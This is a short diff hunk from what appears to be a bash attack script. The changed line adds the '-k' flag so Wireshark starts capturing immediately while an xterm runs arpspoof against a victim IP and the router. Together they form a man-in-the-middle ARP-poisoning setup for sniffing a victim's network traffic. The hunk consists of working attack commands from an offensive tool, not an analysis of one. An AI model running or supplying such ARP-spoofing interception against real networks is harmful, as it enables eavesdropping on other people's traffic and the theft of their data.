@@ -71,7 +71,7 @@ if [[ $sniffer == 1 ]];
 then 
 echo -e "\n${blue}Ctrl-C${reset} For Cancel\n"
 
-sudo wireshark -i $interface | xterm -e sudo arpspoof -i $interface -t $ip_victim $router_ip -r 
+sudo wireshark -k -i $interface | xterm -e sudo arpspoof -i $interface -t $ip_victim $router_ip -r 
 
 elif [[ $sniffer == 2 ]];then
 
